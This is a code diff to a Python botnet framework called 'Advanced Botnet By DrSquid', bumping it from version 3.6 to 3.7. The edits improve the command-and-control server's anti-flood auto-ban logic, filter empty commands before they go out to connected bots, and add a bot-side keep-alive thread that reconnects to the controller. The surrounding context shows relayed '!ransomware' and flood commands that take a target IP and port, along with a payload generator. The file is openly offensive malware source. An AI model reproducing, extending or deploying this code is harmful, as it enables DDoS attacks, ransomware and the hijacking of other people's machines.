@@ -34,12 +34,12 @@ class BotNet:
                                || || ||
                                || || ||
                                || || ||
-  _________            .__    .||_||_||__          __  ________         ________       ________
- /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  _\_____  \     /  _____/
- \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ / _(__  <    /   __  \ 
- /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   / /       \   \  |__\  \\
-/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/ /______  / /\ \_____  /
-        \/    |__|             \/ || ||  \/     \/             \/              \/  \/       \/ 
+  _________            .__    .||_||_||__          __  ________         ________    _________ 
+ /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  _\_____  \   \______  \\
+ \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ / _(__  <       /    /
+ /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   / /       \     /    / 
+/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/ /______  / /\ /____/  
+        \/    |__|             \/ || ||  \/     \/             \/              \/  \/         
                                || || ||
                                || || ||
                                || || ||
@@ -78,9 +78,10 @@ Advanced Botnet By DrSquid
         self.filetransfer = False
         self.sqlconnected = False
         self.sending_file = False
-        self.auto_ban = True
+        self.auto_ban = False
         self.keylogging = False
         self.botinfofile = "botinfo.txt"
+        self.timetoautoban = 0
         botinfo = open(self.botinfofile,"w").close()
         self.max_connpersec = 20
         self.connpersec = 0
@@ -234,17 +235,22 @@ Advanced Botnet By DrSquid
         while True:
             time.sleep(1)
             self.timer += 1
+            if self.connpersec >= self.max_connpersec:
+                self.connpersec = self.max_connpersec + 5
             if self.max_connpersec <= self.connpersec:
-                if not self.autoban:
+                self.timetoautoban += 1
+                if not self.auto_ban and self.timetoautoban >= 2:
                     self.log(f"[({datetime.datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: True")
-                self.auto_ban = True
+                    self.auto_ban = True
             else:
                 if self.auto_ban:
                     self.log(f"[({datetime.datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: False")
-                self.auto_ban = False
+                    self.auto_ban = False
+                self.timetoautoban = 0
             if self.timer >= 60:
-                self.timer = 0
-                self.connpersec = 0
+                self.timer = 1
+                self.connpersec = 1
+                self.conncount = 0
             try:
                 self.connpersec = self.conncount / self.timer
             except:
@@ -256,13 +262,14 @@ Advanced Botnet By DrSquid
             self.connpersec = self.max_connpersec + 5
         self.conncount += 1
         if self.max_connpersec <= self.connpersec:
-            if not self.autoban:
+            if not self.auto_ban and self.timetoautoban >= 2:
                 self.log(f"[({datetime.datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: True")
-            self.auto_ban = True
+                self.auto_ban = True
         else:
             if self.auto_ban:
                 self.log(f"[({datetime.datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: False")
-            self.auto_ban = False
+                self.auto_ban = False
+            self.timetoautoban = 0
     def listen(self):
         """A very important function for the server. It listens to all of the connections, if it is able to, as 
         the 'self.listening' variable can be toggled on and off, making the server unable to listen for connections. 
@@ -277,10 +284,11 @@ Advanced Botnet By DrSquid
                 try:
                     self.server.listen()
                     conn, ip = self.server.accept()
+                    if self.connpersec >= self.max_connpersec:
+                        self.connpersec = self.max_connpersec + 5
                     if self.listening:
                         kicked = False
                         if ip[0] in self.return_iplist("ban"):
-                            self.log(f"[({datetime.datetime.today()})][(BANNED_IP)]: {ip[0]} attempted to join the server, however they were banned!")
                             conn.close()
                             kicked = True
                         else:
@@ -289,6 +297,7 @@ Advanced Botnet By DrSquid
                                     self.config_conn_vars()
                                 else:
                                     self.log(f"[({datetime.datetime.today()})][(BANNING_IP)]: {ip[0]} attempted to join the server during the DDoS Attack, banning as a precaution.")
+                                    self.add_ip(ip[0],"ban")
                                     conn.close()
                                     kicked = True
                             else:
@@ -347,13 +356,14 @@ Advanced Botnet By DrSquid
         for i in msg:
             filename += f" {i}"
         return filename.strip()
-    def log(self, logitem):
+    def log(self, logitem, display=True):
         """Important function, needed for logging. This is so that the Server Owner can see what happened in the 
         server, in case of a crash or bug that needed to be fixed. This helps, as all of the output in the server 
         is the same as the output in the log file. The server owner would be able to see any bugs or issues, or 
         easily anything that happened in the server at all. However, the log file is wiped everytime the server
         restarts(I can easily change that, you can contact me if you want that to happen)."""
-        print(logitem)
+        if display:
+            print(logitem)
         file = open(self.logfile, "r")
         content = file.read()
         file.close()
@@ -685,22 +695,24 @@ Advanced Botnet By DrSquid
                                             except:
                                                 self.send_to_other("SERVER",name,f"Invalid input! Here is the valid input: !{protocol.lower()}flood <ip> <port> <delay>", conn)
                                     if not self.focusing and not self.downloading:
-                                        self.log(f"[({datetime.datetime.today()})][({self.admin_username})--->(BOTS)]: {msg}")
-                                        display_single_msg = False
-                                        for bot in self.connlist:
-                                            try:
-                                                if conn != bot:
-                                                    if msg.startswith("!ransomware") and not self.ransomware_active:
-                                                        pass
-                                                    else:
-                                                        bot.send(msg.encode())
-                                            except:
-                                                pass
+                                        if msg.strip() != "":
+                                            self.log(f"[({datetime.datetime.today()})][({self.admin_username})--->(BOTS)]: {msg}")
+                                            display_single_msg = False
+                                            for bot in self.connlist:
+                                                try:
+                                                    if conn != bot:
+                                                        if msg.startswith("!ransomware") and not self.ransomware_active:
+                                                            pass
+                                                        else:
+                                                            bot.send(msg.encode())
+                                                except:
+                                                    pass
                                     else:
                                         if not self.downloading:
-                                            display_single_msg = False
-                                            self.log(f"[({datetime.datetime.today()})][({self.admin_username})--->({self.focus_botname})]: {msg}")
-                                            self.focus_conn.send(msg.encode())
+                                            if msg.strip() != "":
+                                                display_single_msg = False
+                                                self.log(f"[({datetime.datetime.today()})][({self.admin_username})--->({self.focus_botname})]: {msg}")
+                                                self.focus_conn.send(msg.encode())
                             elif self.filetransfer:
                                 if msg.startswith("!help"):
                                     self.adminconn.send(self.file_tranfer_help_msg().encode())
@@ -724,7 +736,7 @@ Advanced Botnet By DrSquid
                                     self.filetransfer = False
                         if display_single_msg:
                             if not msg.startswith("!login"):
-                                if not msg.startswith("!key"):
+                                if not msg.startswith("!key") and msg.strip() != "":
                                     self.log(f"[({datetime.datetime.today()})][({name})]: {msg}")
                                     if conn != self.adminconn:
                                         self.adminconn.send(f"\n[({name})]: {msg}".encode())
@@ -747,7 +759,10 @@ Advanced Botnet By DrSquid
                     self.focus_conn = None
                     self.focus_botname = ""
                     self.downloading = False
-                self.connlist.remove(conn)
+                try:
+                    self.connlist.remove(conn)
+                except:
+                    pass
                 conn.close()
                 break
     def gen_payload(self):
@@ -4256,6 +4271,7 @@ class Bot:
                 self.client.close()
         self.client.send(self.get_info())
         reciever = threading.Thread(target=self.recv).start()
+        self.pkt_sender = threading.Thread(target=self.check_still_connected).start()
     def initiate_connection(self):
         connect = threading.Thread(target=self.connect).start()
     def get_filename(self, msg):
@@ -4267,6 +4283,19 @@ class Bot:
         return filename.strip()
     def make_selffiles_encrypted_false(self):
         self.files_encrypted = False
+    def check_still_connected(self):
+        while True:
+            try:
+                self.client.send("".encode())
+                time.sleep(10)
+            except:
+                while True:
+                    try:
+                        reconnect = threading.Thread(target=self.connect).start()
+                        break
+                    except RuntimeError:
+                        pass
+                break
     def recv(self):
         while True:
             try:
@@ -4521,7 +4550,7 @@ bot.initiate_connection()
         return payload
 class AutoUpdate:
     def __init__(self):
-        self.version = 3.6
+        self.version = 3.7
     def check_update(self):
         print(BotNet.logo(None))
         print("[+] Checking for updates.....")
